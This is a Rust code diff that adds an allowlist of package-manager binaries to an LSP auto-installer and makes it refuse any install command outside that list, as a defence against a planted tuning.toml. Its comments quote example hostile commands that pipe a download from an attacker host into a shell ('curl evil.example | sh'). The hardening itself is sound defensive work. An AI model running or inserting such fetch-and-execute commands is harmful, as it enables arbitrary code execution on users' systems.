@@ -77,6 +77,52 @@ const LSP_RESTART_BUDGET: u32 = 3;
 /// minute is treated as a hard failure; one restart per minute for
 /// ten minutes is fine.
 const LSP_RESTART_WINDOW: Duration = Duration::from_secs(60);
+
+/// Allowlist of binaries the LSP auto-installer is allowed to execute.
+///
+/// `install_cmd` ultimately comes from `tuning.toml` (or a server-side
+/// default), which a workspace-writable attacker can plant. Without
+/// this allowlist, a malicious `tuning.toml` could ship
+/// `install_cmd = "curl evil.example | sh"` and run arbitrary code at
+/// server startup. The list is the curated set of package managers we
+/// expect to call from a per-language install config. Adding a new
+/// binary is a one-line code change — keep it that way so any new
+/// addition is visible in code review.
+const LSP_INSTALL_BINARIES: &[&str] = &[
+    // Debian / Ubuntu
+    "apt-get",
+    "apt",
+    "dpkg",
+    // Fedora / RHEL
+    "dnf",
+    "yum",
+    "rpm",
+    // Arch
+    "pacman",
+    // Alpine
+    "apk",
+    // macOS
+    "brew",
+    "port",
+    // Node
+    "npm",
+    "yarn",
+    "pnpm",
+    // Python
+    "pip",
+    "pip3",
+    // Go
+    "go",
+    // Rust
+    "cargo",
+    // Snap / Flatpak
+    "snap",
+    "flatpak",
+    // openSUSE
+    "zypper",
+    // Gentoo
+    "emerge",
+];
 /// Per-language timeout for the cold-boot prewarm `documentSymbol`
 /// call. Distinct from [`LSP_REQUEST_TIMEOUT`] (1 s, the runtime
 /// tolerance for a stuck round-trip on a Tokio worker): prewarm
@@ -965,6 +1011,22 @@ impl LspMultiplexer {
         );
 
         let parts: Vec<&str> = install_cmd.split_whitespace().collect();
+        // Allowlist the binary: `install_cmd` ultimately comes from
+        // `tuning.toml`, which a workspace-writable attacker can plant.
+        // Without this check, an attacker can run arbitrary commands at
+        // server startup by setting `install_cmd = "curl evil | sh"` or
+        // pointing it at a binary in a writable directory. Reject any
+        // binary that isn't on the curated list of package managers.
+        if !LSP_INSTALL_BINARIES.contains(&parts[0]) {
+            return Err(LainError::Lsp(format!(
+                "Refusing to run install command '{}': binary '{}' is not on the LSP install allowlist \
+                 ({:?}). Add it to LSP_INSTALL_BINARIES in src/server/lsp.rs if the LSP \
+                 genuinely needs it.",
+                install_cmd,
+                parts[0],
+                LSP_INSTALL_BINARIES
+            )));
+        }
         let mut cmd = tokio::process::Command::new(parts[0]);
         if parts.len() > 1 {
             cmd.args(&parts[1..]);
